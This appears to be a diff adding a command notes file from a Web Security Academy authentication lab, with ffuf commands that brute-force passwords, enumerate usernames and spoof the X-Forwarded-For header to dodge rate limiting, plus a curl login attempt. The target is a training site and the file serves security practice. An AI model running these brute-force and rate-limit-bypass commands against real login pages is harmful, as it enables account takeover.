@@ -1,0 +1,30 @@
+ffuf -w ./WordList/password.txt:PASS\
+  -u https://0aee00f9045622d082eb3d8800f000ee.web-security-academy.net/login \
+  -X POST \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "username=apple&password=PASS" \
+  -od ./Auth_vulnerabilities/lab5/pass_responses
+
+  ffuf -w ./WordList/username.txt:USER -w ./Auth_vulnerabilities/lab5/null_payloads.txt:NULL \
+  -u https://0aee00f9045622d082eb3d8800f000ee.web-security-academy.net/login \
+  -X POST \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "username=USER&password=example NULL" \
+  -mode clusterbomb \
+  -t 1 \
+  -p 0.2 \
+  -od ./Auth_vulnerabilities/lab5/user_responses \
+  -of json -o ./Auth_vulnerabilities/lab5/results.json
+
+
+ffuf -w password.txt:PASS \
+  -u https://0aee00f9045622d082eb3d8800f000ee.web-security-academy.net/login \
+  -X POST \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -H "X-Forwarded-For: 1.1.1.PASS" \
+  -d "username=announcements&password=PASS" \
+  -mc 302
+
+curl -s -X POST https://0aee00f9045622d082eb3d8800f000ee.web-security-academy.net/login \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "username=atlanta&password=peter"
